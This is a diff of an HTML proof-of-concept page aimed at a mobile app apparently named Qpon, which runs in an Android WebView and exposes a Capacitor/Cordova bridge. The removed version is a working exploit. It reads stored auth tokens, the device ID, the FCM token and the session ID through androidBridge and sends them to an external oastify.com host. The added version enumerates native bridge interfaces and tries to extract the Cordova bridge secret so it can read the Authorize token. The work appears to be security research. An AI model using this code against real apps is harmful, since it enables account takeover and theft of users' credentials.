@@ -1,72 +1,90 @@
 <html>
-<head><title>X</title></head>
+<head><title>Qpon</title></head>
 <body>
-<div id="s" style="display:none"></div>
+<pre id="log"></pre>
 <script>
-var stolen = {};
+var L=document.getElementById("log");
+function log(s){L.textContent+=s+"\n";console.log(s)}
 
-window.Capacitor = {
-  fromNative: function(d) {
-    var cid = d.callbackId;
-    var val = d.data ? d.data.value : null;
+log("=== Bridge Enumeration ===");
+log("domain: "+document.domain);
+log("origin: "+window.location.origin);
 
-    if (cid === "t1" && val) {
-      stolen.accessToken = val;
-      document.getElementById("s").textContent += "Authorize: " + val.substring(0,40) + "...\n";
-    }
-    if (cid === "t2" && val) {
-      stolen.tokenInfo = val;
-      document.getElementById("s").textContent += "TokenInfo: " + val.substring(0,60) + "...\n";
-    }
-    if (cid === "t3") {
-      stolen.keys = d.data ? JSON.stringify(d.data.keys) : null;
-      document.getElementById("s").textContent += "Keys: " + stolen.keys + "\n";
-    }
-    if (cid === "t4" && val) {
-      stolen.deviceId = val;
-    }
-    if (cid === "t5" && val) {
-      stolen.fcm = val;
-    }
-    if (cid === "t6" && val) {
-      stolen.sessionId = val;
-    }
-
-    if (stolen.accessToken) {
-      var img = new Image();
-      img.src = "https://b9lna30rpsgxcbr4hgm2so8tekkb81wq.oastify.com/steal?d=" + encodeURIComponent(JSON.stringify(stolen));
-    }
-  }
+// Check ALL known interfaces
+var bridges={
+  "androidBridge":window.androidBridge,
+  "androidBridge.postMessage":window.androidBridge&&window.androidBridge.postMessage,
+  "_cordovaNative":window._cordovaNative,
+  "_cordovaNative.exec":window._cordovaNative&&window._cordovaNative.exec,
+  "_cordovaNative.retrieveJsMessages":window._cordovaNative&&window._cordovaNative.retrieveJsMessages,
+  "_cordovaNative.setNativeToJsBridgeMode":window._cordovaNative&&window._cordovaNative.setNativeToJsBridgeMode,
+  "CapacitorCookiesAndroidInterface":window.CapacitorCookiesAndroidInterface,
+  "CapacitorCookiesAndroidInterface.setCookie":window.CapacitorCookiesAndroidInterface&&window.CapacitorCookiesAndroidInterface.setCookie,
+  "CapacitorCookiesAndroidInterface.isEnabled":window.CapacitorCookiesAndroidInterface&&window.CapacitorCookiesAndroidInterface.isEnabled,
+  "CapacitorHttpAndroidInterface":window.CapacitorHttpAndroidInterface,
+  "CapacitorHttpAndroidInterface.isEnabled":window.CapacitorHttpAndroidInterface&&window.CapacitorHttpAndroidInterface.isEnabled,
 };
 
-function call(id, key) {
-  androidBridge.postMessage(JSON.stringify({
-    type: "js.call",
-    callbackId: id,
-    pluginId: "Preferences",
-    methodName: "get",
-    options: { key: key }
-  }));
+for(var k in bridges){
+  var v=bridges[k];
+  var t=typeof v;
+  if(v&&t==="function"){log("[CALLABLE] "+k+" = "+t)}
+  else if(v&&t==="object"){log("[OBJECT]   "+k+" = "+t)}
+  else{log("[MISSING]  "+k)}
 }
 
-function keys() {
-  androidBridge.postMessage(JSON.stringify({
-    type: "js.call",
-    callbackId: "t3",
-    pluginId: "Preferences",
-    methodName: "keys",
-    options: {}
-  }));
-}
+// Call anything that's available
+try{
+  var ce=window.CapacitorCookiesAndroidInterface.isEnabled();
+  log("\nCookies.isEnabled() = "+ce);
+}catch(e){log("Cookies.isEnabled: "+e.message)}
 
-setTimeout(function() {
-  call("t1", "Authorize");
-  call("t2", "tokenInfo");
-  keys();
-  call("t4", "deviceId");
-  call("t5", "fcm-token");
-  call("t6", "qpon_session_id");
-}, 500);
+try{
+  var he=window.CapacitorHttpAndroidInterface.isEnabled();
+  log("Http.isEnabled() = "+he);
+}catch(e){log("Http.isEnabled: "+e.message)}
+
+// Try _cordovaNative.exec with secret=0 to see error type
+try{
+  var r=window._cordovaNative.exec(0,"Preferences","get","t1",'[{"key":"Authorize"}]');
+  log("\n_cordovaNative.exec(0,...) = "+r);
+}catch(e){log("_cordovaNative.exec(0,...): "+e.message)}
+
+// Try gap_init via prompt to get bridge secret
+try{
+  var secret=prompt("","gap_init:1");
+  log("\ngap_init result: "+JSON.stringify(secret));
+  if(secret&&secret!==""){
+    log("SECRET OBTAINED: "+secret);
+    // Try exec with obtained secret
+    var s=parseInt(secret);
+    var r2=window._cordovaNative.exec(s,"Preferences","get","t2",'[{"key":"Authorize"}]');
+    log("exec with secret: "+r2);
+  }
+}catch(e){log("gap_init: "+e.message)}
+
+// Scan all window properties for any other bridge
+log("\n=== Window Object Scan ===");
+var found=[];
+for(var p in window){
+  try{
+    var o=window[p];
+    if(o&&typeof o==="object"&&o!==window&&o!==document&&o!==navigator&&o!==location&&o!==history){
+      var s=String(o);
+      if(s==="[object Object]"){
+        var ms=[];
+        for(var m in o){if(typeof o[m]==="function")ms.push(m)}
+        if(ms.length>0&&ms.length<15){
+          found.push(p+": "+ms.join(","));
+          log("[BRIDGE?] window."+p+" → "+ms.join(", "));
+        }
+      }
+    }
+  }catch(e){}
+}
+if(!found.length)log("No unknown bridge objects found");
+
+log("\n=== Done ===");
 </script>
 </body>
 </html>
